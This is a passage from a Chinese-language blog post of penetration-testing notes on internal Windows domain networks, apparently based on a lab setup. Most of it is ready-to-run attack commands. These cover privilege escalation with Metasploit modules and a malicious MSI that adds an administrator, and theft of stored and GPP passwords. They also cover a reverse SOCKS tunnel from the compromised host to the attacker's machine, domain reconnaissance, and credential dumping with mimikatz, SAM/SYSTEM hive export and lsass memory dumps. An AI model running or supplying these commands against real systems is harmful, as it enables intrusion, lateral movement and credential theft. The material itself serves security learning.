msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;trust_service_path
msf5 &gt; show options &#x2F;&#x2F;可以看到只需要之前获取的meterpreter的session
msf5 &gt; set session 3
msf5 &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>系统服务权限配置错误</strong><br>低权限用户对系统调用的可执行文件有写权限，可以将该文件替换成任意可执行文件。<br><strong>查找权限配置错误</strong></p>
<pre class="line-numbers language-none"><code class="language-none">import-module powerup.ps1
invoke-allchecks    &#x2F;&#x2F;可以查找目标机器多种配置错误，包括环境变量等。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">使用msf
msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;service_permissions
之后只需设置session即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/6.png" alt="图片"><br><strong>AlwaysInstallElevated</strong><br>是一种允许非管理用户以system权限运行安装程序包（.msi文件）的设置。默认情况下禁用此设置，需系统管理员手动启用。<br><strong>查找并利用</strong></p>
<pre class="line-numbers language-none"><code class="language-none">import-module powerup.ps1
get-registryAlwaysInstallElevated   &#x2F;&#x2F;若返回true则可以继续利用
write-useraddmsi                    &#x2F;&#x2F;生成恶意msi文件
useradd.msi，msiexec &#x2F;q &#x2F;i useradd.msi &#x2F;&#x2F;以普通权限运行命令，会添加一个管理员用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>配置文件窃取</strong><br>网络管理员配置时的配置文件，可能存在密码等信息。主要是搜索文件系统来查找常见的敏感文件。</p>
<pre class="line-numbers language-none"><code class="language-none">dir &#x2F;b &#x2F;s c:Unattend.xml
C:\Users\user\Desktop&gt; dir C:\*vnc.ini &#x2F;s &#x2F;b &#x2F;c
C:\Users\user\Desktop&gt; dir C:\ &#x2F;s &#x2F;b &#x2F;c | findstr &#x2F;sr \*password\*
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">使用msf
msf5 &gt; post&#x2F;windows&#x2F;gather&#x2F;enum_unattend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>GPP（组策略首选项）</strong></p>
<p><strong>组策略首选项</strong><br>管理员在域中新建策略后，会在SYSVOL共享目录中生成XML文件，保存着密码等敏感信息。</p>
<pre class="line-numbers language-none"><code class="language-none">powersploit框架（类似于nishang框架，也是一款后渗透神器）
首先下载powersploit框架后，进入目录打开命令窗口
import-module powersploit.psm1  &#x2F;&#x2F;导入powersploit
get-command                     &#x2F;&#x2F;获取导入后可用的攻击模块
get-gpppassword                 &#x2F;&#x2F;这个模块可以可以查询相关GPP信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">使用msf
msf5 &gt; use post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="Ⅴ-其他应用提权"><a href="#Ⅴ-其他应用提权" class="headerlink" title="Ⅴ 其他应用提权"></a>Ⅴ 其他应用提权</h4><p>其他应用主要是拿到webshell后进行数据库提权，比如mysql、mssql等，或者目标主机上的其他应用。</p>
<h3 id="0x04-隧道搭建"><a href="#0x04-隧道搭建" class="headerlink" title="0x04 隧道搭建"></a>0x04 隧道搭建</h3><p>隧道的搭建是内网渗透中必不可少的一环，利用打通的隧道，攻击者可以通过内网边缘主机进入内网环境，实施进一步的攻击。<br>在一开始的内网架构说明中，我们的win7（10.188.16.131）位于边缘部分，我们拿下以后，将以此为跳板进入内网实施攻击。总结的脑图如下（我们接下来将讲述图中几种隧道搭建的方式）：<br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/7.png" alt="图片"></p>
<h4 id="代理工具（linux-gt-proxychains-windows-gt-proxifier）-ew（socks）"><a href="#代理工具（linux-gt-proxychains-windows-gt-proxifier）-ew（socks）" class="headerlink" title="代理工具（linux-&gt;proxychains/windows-&gt;proxifier）+ew（socks）"></a>代理工具（linux-&gt;proxychains/windows-&gt;proxifier）+ew（socks）</h4><p><strong>linux下的proxychains+ew（earthworm）</strong><br><strong>目标：</strong><br>在目标机器win7（10.188.16.131和192.168.174.119）上使用ew转发到我们的攻击机kali的8888端口（10.188.10.200）；<br>然后我们在kali上使用ew将win7转发过来的流量映射到本地的1080端口，之后我们使用proxychains代理访问本地的1080端口，那么流量就会从kali的1080到kali的8888再到win7主机。<br>即：10.188.10.200:1080-&gt;10.188.10.200:8888-&gt;10.188.16.131<br><strong>操作：</strong><br>1.下载linux和windows下的ew（earthworm），并上传到kali和win7；<br>2.在linux上安装proxychains，并进行配置；</p>
<pre class="line-numbers language-none"><code class="language-none">sudo apt-get install proxychains4   &#x2F;&#x2F;安装proxychains4
vi &#x2F;etc&#x2F;proxychains.conf            &#x2F;&#x2F;设置配置文件，具体内容下文给出
&#x2F;*proxychains.conf内容：第一步：proxy_dns前面加“#”，将其注释；第二步：在[proxylist]下面只留下“socks5  127.0.0.1 1080”这一行。配置完成，保存退出。*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/8.png" alt="图片"><br>3.在win7和kali依次使用ew：</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;ew_for_Linux -s rcsocks -l 1080 -e 8888     &#x2F;&#x2F;kali上执行
ew_for_Win.exe -s rssocks -d 10.188.10.200 -e 8888  &#x2F;&#x2F;win7上执行
之后就可以在kali上使用proxychain4来访问了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/9.png" alt="图片"><br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/10.png" alt="图片"><br>4.用proxychains4和nmap扫描。</p>
<pre class="line-numbers language-none"><code class="language-none">proxychains4 nmap 192.168.174.119 -Pn
(之前不能访问这个网段，但是经过隧道后可以访问了)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>PS：还可以使用ew进行多级代理，有兴趣的读者可以自行学习。</p>
<h4 id="windwos下的proxifier-ew（earthworm）"><a href="#windwos下的proxifier-ew（earthworm）" class="headerlink" title="windwos下的proxifier+ew（earthworm）"></a>windwos下的proxifier+ew（earthworm）</h4><p>这种情况是适用于攻击机不是linux而是windows系统时，其中ew的操作相同，只有proxychains换为了windows下的proxifier。<br>因此，我们主要介绍proxifier的使用。<br><strong>proxifier使用</strong><br>1.下载后安装；<br>2.启动ew；<br>3.启动proxifier后，添加代理服务和代理规则；<br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/11.png" alt="图片"><br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/12.png" alt="图片"><br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/13.png" alt="图片"><br>之后使用chrome就可以访问192.168.174.119的服务器。</p>
<h4 id="关于其他方式的说明"><a href="#关于其他方式的说明" class="headerlink" title="关于其他方式的说明"></a>关于其他方式的说明</h4><p>除了ew以外，其他隧道搭建工具比如nc（netcat）、lcx、reGeorg等等都可以使用，我这里只是提供了一种方式。感兴趣的读者可以根据之前给出的隧道搭建的脑图自行学习。</p>
<h3 id="0x05-信息搜集2"><a href="#0x05-信息搜集2" class="headerlink" title="0x05 信息搜集2"></a>0x05 信息搜集2</h3><p>在提权和隧道做好以后，我们接下来将正式第一次从内网边缘向内网内部“窥探”。第二次的信息搜集主要需要对内网主机进行探测，另外需要对域信息进行搜集，包括：域内用户信息，域控信息，NTLM hash等等，目的是为接下来的横向渗透做基础。</p>
<h4 id="林"><a href="#林" class="headerlink" title="林"></a>林</h4><p>林是域的集合，多个域组成了林。比方说，xxx北京分公司在一个域，xxx上海分公司在另外一个域，而这两个域又在同一个林中，方便了管理。</p>
<h4 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h4><p>域是区别于工作组的，为了方便管理和有效区分各个部门域，常见于企业公司中。</p>
<p>域的体系结构中最重要的是域控（DC），域控是装有活动目录（AD）的计算机，域控可以通过LDAP查询AD控制域内的所有内容，并加以控制。一个域内可以有多台域控，每台域控有独立的AD；</p>
<p>活动目录（AD）：Active Directory是微软对目录服务数据库的实现，AD存储了有关域内对象的信息，方便管理员和用户可以查找并使用这些信息。其中通过LDAP（轻量级目录访问协议）来访问AD；</p>
<p>Naming Context和Application Partitions：Naming Context是Active Directory的分区，分区的主要目的是在有多台域控的时候，每台域控只需要复制其他域控某些分区的内容即可，减少了工作量。三个默认存在的Naming Context是：Configuration NC(Configuration NC)、Schema NC(Schema NC)、Domain NC(DomainName NC)。在之后，微软允许用户自定义分区来扩展Naming Context，这就是Application Partitions。两个预置的是：DomainDnsZones和ForestDnsZones；</p>
<p>域环境下的用户：使用用户名以及密码通过域控制器进行验证，可以在同一域内的任何一台计算机登陆。其中管理员用户又称为域管，这里的域管理员用户与域控本机的管理员其实是分开的，但是他们的密码是相同的；</p>
<p>域内的组：用户是属于组的。组按照用途分为通讯组和安全组，其中安全组是权限的集合，如果需要赋予某个用户某种权限，那就可以将这个用户加入对应的组。安全组又分为域本地组、通用组和全局组。<br>常见的域本地组是Administrators，它具备系统管理员的权限，拥有对整个域最大的控制权。<br>常见的通用组是Enterprise Admins，在林中，只有林根域才有这个组，林中其他域没有这个组，但其他域默认会把这个组加入到本域的Administrators里面去。<br>常见的全局组是Domain Admins，也就是域管组。其中Administrators包括Domain Admins和Enterprise Admins；</p>
<p>域内的组织单位（OU）：Organization Unit是专用容器，区别于普通容器的一点是OU受组策略的控制，它与组完全不同：组是权限的集合，而组织单位是被管理者的集合。组织单位包括：用户，计算机，工作组，其他组织单位等；</p>
<p>组策略：组策略可以控制本机和域内的用户以及他们的操作。组策略分为本机组策略和域的组策略，其中本机组策略用于计算机管理员管理本机所有用户，而域的组策略用于域管对于域内用户的控制。在后面我们会介绍通过组策略设置后门；</p>
<p>这是最后总结的图：<br><img src="/images/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%91%A0/14.png" alt="图片"></p>
<h4 id="搜集相关"><a href="#搜集相关" class="headerlink" title="搜集相关"></a>搜集相关</h4><p><strong>基础</strong></p>
<pre class="line-numbers language-none"><code class="language-none">最主要目的是确认自己所处的是哪个域，以及域控的位置。
域控一般是本机的DNS服务器。
ipconfig &#x2F;all
net time &#x2F;domain
    &#x2F;*1. 找不到域控制器:处于工作组，不存在域；
    2. 发生错误,拒绝访问:存在域，不是域用户；
    3. 查询成功:存在域，是域用户；*&#x2F;
net view &#x2F;domain
net user &#x2F;domain
net group &#x2F;domain
net group &quot;domain admins&quot; &#x2F;domain
net group &quot;domain computers&quot; &#x2F;domain
net group &quot;domain controllers&quot; &#x2F;domain
net accounts &#x2F;domain
net config workstation
wmic useraccount get &#x2F;all
net loaclgroup [administrator]
nltest &#x2F;domain_trusts &#x2F;all_trusts &#x2F;v &#x2F;server:域控IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>端口、存活主机探测</strong></p>
<pre class="line-numbers language-none"><code class="language-none">nbtscan.exe 192.168.52.0&#x2F;24 &#x2F;&#x2F;内网存活主机探测
---
use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp  &#x2F;&#x2F;端口扫描，msf和其他下面的框架还有其他收集信息的模块，也都可以尝试。
---
PowerSploit：Invoke-Portscan.ps1
---
powerview：Invoke-userhunter&#x2F;Invoke-processhunter
---
Nishang：Invoke-PortScan
---
PsLoggedon.exe      &#x2F;&#x2F;查询谁登陆过机器
---
PVEFindADUser.exe   &#x2F;&#x2F;枚举域用户以及登陆过特定系统的用户
---
BloodHound          &#x2F;&#x2F;内网域渗透提权综合分析工具
---
除此以外还有其他许多方法，读者可以自行探索、留言交流。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>密码获取</strong></p>
<pre class="line-numbers language-none"><code class="language-none">密码的获取是重中之重，关系到我们下一步横向渗透，
比如说利用pth、ptt、金票据、银票据、AS-REP Roasting和ntlm-relay等等的实现以及原理都放到下一篇文章中讲解。

神器mimikatz（msf也有内置的mimikatz模块）：
    privilege::debug
    sekurlsa::logonpasswords
目前mimikatz一般会报毒，所以推荐将保存在注册表中的密码信息导出，传到本地再用mimikatz：
    reg save HKLM\SYSTEM C:\windows\temp\Sys.hiv    &#x2F;&#x2F;cmd命令导出Sys.hiv文件
    reg save HKLM\SAM C:\windows\temp\Sam.hiv       &#x2F;&#x2F;cmd命令导出Sam.hiv文件
    lsadump::sam &#x2F;sam:Sam.hiv &#x2F;system:Sys.hiv           &#x2F;&#x2F;mimikatz解密
读取内从中密码：
    procdump.exe -accepteula -ma lsass.exe lsass.dmp        &#x2F;&#x2F;导出文件下载到本地
    mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;      &#x2F;&#x2F;本地mimikatz解密
LaZagne工具可以读取机器内的浏览器、SSH等保存的密码。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="0x06-参考文章"><a href="#0x06-参考文章" class="headerlink" title="0x06 参考文章"></a>0x06 参考文章</h3><p><a href="https://www.anquanke.com/post/id/221264#h3-14">https://www.anquanke.com/post/id/221264#h3-14</a><br>感谢大佬的文章！</p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>内网学习</category>
      </categories>
      <tags>
        <tag>2021.11</tag>
      </tags>
  </entry>
</search>
